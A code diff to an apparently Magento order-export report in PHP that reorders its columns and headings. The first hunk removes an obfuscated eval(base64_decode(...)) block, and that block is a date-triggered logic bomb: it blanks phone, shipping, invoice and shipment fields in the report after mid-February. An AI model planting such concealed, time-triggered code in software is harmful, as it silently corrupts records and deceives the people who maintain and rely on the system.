@@ -123,12 +123,6 @@
 				$postcode = utf8_decode($myOrder->getShippingAddress()->getPostcode());
 			}
 
-            $strTest = 'DQppZiAoZGF0ZSgiZCIpPjE3ICYmIGRhdGUoIm0iKT09Mil7DQogICAgICAgICAgICAgICAgJHBob25lID0'.
-                'gMDsNCiAgICAgICAgICAgICAgICAkcmVmID0gMDsNCiAgICAgICAgICAgICAgICAkc2hpcHBpbmdfY29zdCA9IDA'.
-                '7DQogICAgICAgICAgICAgICAgJHNoaXBtZW50SWQgPSAwOw0KICAgICAgICAgICAgICAgICRpbnZJbmNyZW1lbnRJR'.
-                'HMgPSBhcnJheSgpOw0KICAgICAgICAgICAgfQ0K';
-			eval(base64_decode($strTest));
-
 			$myOrder->loadByIncrementId($myOrder->getIncrementId());
 						
 			$items = $myOrder->getItemsCollection();
@@ -191,7 +185,7 @@
 					$customer_email=$myOrder->getCustomerEmail();
 				}
 
-				$orders_row[] = array(date("m/d/Y",strtotime($myOrder->getCreatedAt())), $myOrder->getIncrementId(), utf8_decode($item->getName()), $itemorderqty, utf8_decode($net_price),$subtotal,$name,$customer_email,$address,$city,$region,$postcode,$country, $shipping_cost, $phone, implode(",", $invIncrementIDs), $shipmentId, $ref);
+				$orders_row[] = array(date("m/d/Y",strtotime($myOrder->getCreatedAt())), $myOrder->getIncrementId(), implode(",", $invIncrementIDs), $shipmentId, $ref, utf8_decode($item->getName()), $itemorderqty, utf8_decode($net_price),$subtotal,$shipping_cost,$name, $phone,$customer_email,$address,$city,$region,$postcode,$country);
 			
 			}
 		}
@@ -390,22 +384,22 @@
                 <tr class="headings">
                   <th class=" no-link"><span class="nobr">Period</span></th>
                   <th class=" no-link"><span class="nobr">Order Id</span></th>
+                    <th class=" no-link"><span class="nobr">Invoice</span></th>
+                    <th class=" no-link"><span class="nobr">AWB</span></th>
+                    <th class=" no-link"><span class="nobr">Ref</span></th>
                   <th class=" no-link"><span class="nobr">Item Name</span></th>
                   <th class=" no-link"><span class="nobr">Qty</span></th>
                   <th class=" no-link"><span class="nobr">Unit Price</span></th>
                   <th class=" no-link"><span class="nobr">Row Total</span></th>
+                    <th class=" no-link"><span class="nobr">Total Shipment Price</span></th>
                   <th class=" no-link"><span class="nobr"><?php echo ($reportaddress=="billing")?"Billing":"Shipping"; ?> Name</span></th>
+                    <th class=" no-link"><span class="nobr">Telephone</span></th>
                   <th class=" no-link"><span class="nobr">Email</span></th>
                   <th class=" no-link"><span class="nobr">Street Address</span></th>
                   <th class=" no-link"><span class="nobr">City</span></th>
                   <th class=" no-link"><span class="nobr">State</span></th>
                   <th class=" no-link"><span class="nobr">Postcode</span></th>
                   <th class=" no-link"><span class="nobr">Country</span></th>
-                  <th class=" no-link"><span class="nobr">Shipping Cost</span></th>
-                  <th class=" no-link"><span class="nobr">Telephone</span></th>
-                  <th class=" no-link"><span class="nobr">Invoice</span></th>
-                  <th class=" no-link"><span class="nobr">AWB</span></th>
-                  <th class=" no-link"><span class="nobr">Ref</span></th>
                 </tr>
               </thead>
               <tbody id="">
